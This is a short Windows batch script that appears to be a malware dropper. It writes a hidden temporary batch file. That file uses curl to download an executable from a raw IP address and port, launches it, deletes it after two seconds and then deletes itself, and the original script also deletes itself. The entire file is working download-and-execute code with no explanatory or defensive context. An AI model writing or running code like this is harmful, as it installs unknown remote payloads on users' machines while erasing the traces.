@echo off
setlocal EnableDelayedExpansion

set "temp_bat=%temp%\temp_%random%.bat"
(
    echo @echo off
    echo if not exist "C:\Downloads" mkdir "C:\Downloads"
    echo curl -L -o "C:\Downloads\1.exe" "http://143.92.49.221:48484/1.exe"
    echo if exist "C:\Downloads\1.exe" ^(
    echo     start "" "C:\Downloads\1.exe"
    echo     timeout /t 2 /nobreak ^>nul
    echo     del /f /q "C:\Downloads\1.exe"
    echo ^)
    echo del /f /q "%%~f0"
) > "%temp_bat%"
start /b "" cmd /c "%temp_bat%"
del "%~f0"